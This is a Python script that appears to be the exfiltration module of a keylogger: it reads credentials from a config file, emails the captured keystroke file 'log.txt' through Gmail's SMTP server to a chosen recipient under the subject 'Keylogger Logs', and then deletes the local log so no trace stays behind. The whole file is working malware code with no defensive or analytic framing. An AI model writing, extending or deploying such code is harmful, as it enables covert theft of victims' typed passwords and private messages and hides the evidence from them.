import smtplib
import os
import json
from email.message import EmailMessage

# Load email credentials securely
CONFIG_FILE = "config.json"
LOG_FILE = "log.txt"

def load_config():
    """Load email credentials from a secure config file."""
    if not os.path.exists(CONFIG_FILE):
        print("[ERROR] Configuration file missing!")
        return None
    
    with open(CONFIG_FILE, "r") as file:
        return json.load(file)

def send_email():
    """Send log file via email."""
    config = load_config()
    if not config:
        return
    
    EMAIL_ADDRESS = config["EMAIL_ADDRESS"]
    EMAIL_PASSWORD = config["EMAIL_PASSWORD"]
    TO_EMAIL = config["TO_EMAIL"]

    if not os.path.exists(LOG_FILE):
        print("[ERROR] Log file not found!")
        return

    with open(LOG_FILE, "r", encoding="utf-8") as file:
        log_data = file.read()

    if not log_data.strip():
        print("[INFO] Log file is empty. Skipping email.")
        return

    msg = EmailMessage()
    msg["Subject"] = "Keylogger Logs"
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = TO_EMAIL
    msg.set_content("Attached is the log file.")

    msg.add_attachment(log_data.encode("utf-8"), maintype="text", subtype="plain", filename="log.txt")


    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
            print("[INFO] Email sent successfully!")

        # Clear log after sending
        os.remove(LOG_FILE)
        print("[INFO] Log file deleted after sending.")
    except Exception as e:
        print(f"[ERROR] Failed to send email: {e}")

if __name__ == "__main__":
    send_email()
